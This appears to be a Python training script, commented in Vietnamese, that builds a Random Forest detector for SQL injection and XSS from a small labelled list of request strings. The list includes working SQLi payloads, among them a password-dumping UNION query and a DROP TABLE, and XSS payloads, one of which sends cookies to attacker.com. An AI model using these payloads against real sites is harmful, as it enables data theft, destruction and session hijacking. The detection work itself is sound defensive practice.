import os
import pandas as pd
import joblib
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score, classification_report

# 1. Khởi tạo Dataset mở rộng (Mẫu đại diện đa dạng)
data = {
    'payload': [
        # SQL Injection (SQLi)
        "admin' OR '1'='1",
        "' OR 1=1 --",
        "SELECT * FROM users",
        "admin' UNION SELECT null, username, password FROM users --",
        "1' AND 1=2 UNION SELECT 1, @@version, 3 --",
        "1' OR '1'='1' --",
        "' OR 'a'='a",
        "1; DROP TABLE users--",
        "admin'--",
        "' OR 1=1 LIMIT 1 --",

        # XSS (Cross-Site Scripting)
        "<script>alert(1)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS_BYPASS')>",
        "<iframe src=\"javascript:alert(1)\">",
        "<body onload=alert('XSS')>",
        "<script>document.location='http://attacker.com/steal?'+document.cookie</script>",
        "<a href=\"javascript:alert('XSS')\">Click here</a>",
        "<input type=\"text\" value=\"\" onfocus=\"alert(1)\">",

        # Normal (Lưu lượng hợp lệ)
        "GET /index.php",
        "POST /login.php",
        "dienthoai iphone 15",
        "Sách lập trình Python giáo trình",
        "laptop dell inspiron 15 inch",
        "GET /search.php?q=laptop",
        "POST /cart.php action=add",
        "xem san pham giam gia",
        "danh muc thoi trang nam",
        "GET /contact.php"
    ],
    'label': [
        'SQLi', 'SQLi', 'SQLi', 'SQLi', 'SQLi', 'SQLi', 'SQLi', 'SQLi', 'SQLi', 'SQLi',
        'XSS', 'XSS', 'XSS', 'XSS', 'XSS', 'XSS', 'XSS', 'XSS',
        'Normal', 'Normal', 'Normal', 'Normal', 'Normal', 'Normal', 'Normal', 'Normal', 'Normal', 'Normal'
    ]
}

df = pd.DataFrame(data)

# 2. Tiền xử lý & Trích xuất đặc trưng bằng TF-IDF Vectorizer
vectorizer = TfidfVectorizer(ngram_range=(1, 3), analyzer='char')
X = vectorizer.fit_transform(df['payload'])
y = df['label']

# 3. Chia tập dữ liệu Train / Test (80% Train - 20% Test)
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.2, random_state=42, stratify=y
)

# 4. Huấn luyện mô hình Random Forest
model = RandomForestClassifier(n_estimators=100, random_state=42)
model.fit(X_train, y_train)

# 5. Đánh giá mô hình trên tập Test
y_pred = model.predict(X_test)
acc = accuracy_score(y_test, y_pred) * 100

# 6. In bảng báo cáo kết quả chuyên nghiệp ra Terminal
print("\n" + "=" * 50)
print("        MÔ HÌNH MACHINE LEARNING RANDOM FOREST    ")
print("=" * 50)
print(f"[*] Độ chính xác tổng thể (Accuracy): {acc:.2f}%\n")
print("[*] Báo cáo chi tiết (Classification Report):")
print(classification_report(y_test, y_pred))
print("=" * 50 + "\n")

# 7. Đóng gói lưu mô hình và Vectorizer
os.makedirs("models", exist_ok=True)
joblib.dump(model, "models/model_rf.pkl")
joblib.dump(vectorizer, "models/vectorizer.pkl")

print("[+] Đã đóng gói thành công models/model_rf.pkl và models/vectorizer.pkl!")